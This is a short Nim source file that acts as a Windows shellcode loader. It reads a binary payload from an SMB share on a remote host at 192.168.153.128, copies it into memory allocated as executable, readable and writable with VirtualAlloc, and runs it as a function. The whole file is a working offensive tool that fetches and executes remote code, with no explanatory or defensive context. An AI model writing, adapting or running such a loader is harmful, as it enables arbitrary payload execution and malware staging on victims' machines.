import winim/lean

var filename = "\\\\192.168.153.128\\smb\\code.bin"
var file: File = open(filename, fmRead)
var fileSize = file.getFileSize()

var shellcode = newSeq[byte](fileSize)
discard file.readBytes(shellcode,0,fileSize)

type
    buf* = LPVOID
    
var buffer = VirtualAlloc(nil,fileSize,MEM_COMMIT, PAGE_EXECUTE_READWRITE)
copyMem(buffer,shellcode[0].addr,fileSize)

let f = cast[proc(){.nimcall.}](buffer)
f()
